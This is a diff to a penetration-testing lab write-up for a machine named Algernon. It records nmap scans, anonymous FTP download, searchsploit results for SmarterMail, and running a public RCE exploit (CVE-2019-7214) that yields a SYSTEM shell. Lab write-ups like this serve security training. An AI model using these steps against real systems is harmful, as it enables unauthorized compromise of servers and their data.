@@ -1,7 +1,6 @@
 # Algernon.md
 ## Reconnaissance
-### All port scanning
-#### TCP Ports
+### port scanning
 - `nmap -p- -T4 -sS -min-rate 1000 192.168.116.65`
 - `nmap -A -p 21,80,135,139,445,5040,9998,17001,49664,49665,49666,49667,49668,49669 192.168.116.65`
 
@@ -79,7 +78,51 @@
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 188.07 seconds
     ```
-    > as Anonymous login is allowed in ftp let's see into it. The server is Microsoft IIS 
+    > as Anonymous login is allowed in ftp let's see into it.
+    > The web-server used is Microsoft IIS.
+    > Admin Portal is found in http:/192.168.116.65:9998/interface/root
 
-#### UDP Ports
-- `nmap -sU -A --top-ports 20 192.168.116.65`
+- `wget -r ftp://anonymous:anonymous@192.168.116.65` Nothing interesting in those files after Downloading them 
+
+## Exploitation
+![Website](/images/smartermail.png)
+- As SQL injection was not possible in Admin portal.
+<br>![Adminportal](/images/Admin_portal.png) 
+
+```text
+searchsploit smartermail
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+SmarterMail 16 - Arbitrary File Upload                                                                                                                                         | multiple/webapps/48580.py
+SmarterMail 7.1.3876 - Directory Traversal                                                                                                                                     | windows/remote/15048.txt
+SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                                                                                 | asp/webapps/16955.txt
+SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                | asp/webapps/16975.txt
+SmarterMail < 7.2.3925 - LDAP Injection                                                                                                                                        | asp/webapps/15189.txt
+SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                                                                       | asp/webapps/15185.txt
+SmarterMail Build 6985 - Remote Code Execution                                                                                                                                 | windows/remote/49216.py
+SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                                                                     | asp/webapps/31017.php
+smartermail free 9.2 - Persistent Cross-Site Scripting                                                                                                                         | windows/webapps/20362.py
+SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                                                                        | php/webapps/31240.txt
+SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                                                                         | windows/dos/31607.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+```
+searchsploit -m windows/remote/49216.py
+  Exploit: SmarterMail Build 6985 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/49216
+     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
+    Codes: CVE-2019-7214
+ Verified: False
+File Type: Python script, ASCII text executable, with very long lines (4852)
+Copied to: /home/G1/Templates/Web/49216.py
+```
+[exploit.py](/sources/exploit.py)
+```pwsh
+python ./exploit.py
+PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32>
+```
